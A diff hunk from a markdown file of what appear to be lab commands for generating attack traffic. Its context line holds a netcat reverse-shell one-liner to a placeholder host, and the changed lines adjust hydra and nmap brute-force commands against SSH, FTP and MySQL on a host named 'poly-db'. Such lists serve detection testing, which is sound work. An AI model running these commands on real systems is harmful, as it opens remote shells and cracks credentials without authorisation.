@@ -675,18 +675,18 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
 
 ## GENERATE TRAFFIC - SSH bruteforce
 ```
-nmap -p 22 --script ssh-brute x.x.x.x
-hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db SSH
+nmap -p 22 --script ssh-brute poly-db
+hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db ssh
 ```
 
 ## GENERATE TRAFFIC - FTP bruteforce
 ```
-hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db FTP
+hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db ftp
 ```
 
 ## GENERATE TRAFFIC - MYSQL bruteforce
 ```
-hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db MYSQL
+hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db mysql
 ```
 
 ## GENERATE TRAFFIC - MYSQL Request
